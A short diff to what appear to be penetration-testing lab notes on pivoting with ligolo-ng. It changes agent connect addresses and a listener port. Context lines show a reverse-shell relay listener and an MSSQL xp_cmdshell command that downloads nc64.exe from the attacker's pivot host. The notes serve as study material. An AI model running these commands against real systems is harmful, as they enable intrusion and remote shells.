@@ -64,7 +64,8 @@ Third, connect the agent (in the pivot machine) to our proxy in the kali:
 
 ```
 ./agent -connect 10.10.14.72:11601 --ignore-cert
-.\ligolo-ng-agent-windows_amd64.exe -connect 192.168.45.152:11601 --ignore-cert
+.\ligolo-ng-agent-windows_amd64.exe -connect 192.168.49.118:11601 --ignore-cert
+.\ligolo-ng-agent-windows_amd64.exe -connect 10.10.15.203:11601 --ignore-cert
 ```
 
 Once you start the proxy, it listens on the port “11601” by default. So when you connect to your proxy, you need to specify your IP and that default port (unless other configurations are in place).
@@ -145,7 +146,7 @@ In this topology:
 After setting a ligolo agent in the pivot machine and starting the tunel, we achieve to access a service in the target machine. We want to set a rev shell, but the machine does not know how to route the connection back to us. We need to set in the ligolo proxy a listener:
 
 ```
-ligolo-ng » listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:9999
+ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
 ```
 
 Now, lets say, if we have access to this MSQL terminal we can:
@@ -159,3 +160,4 @@ python -m http.server 9999
 EXEC xp_cmdshell 'powershell -c "curl.exe http://$IPpivot:9999/nc64.exe -o C:\Users\Public\nc64.exe"';
 
 ```
+
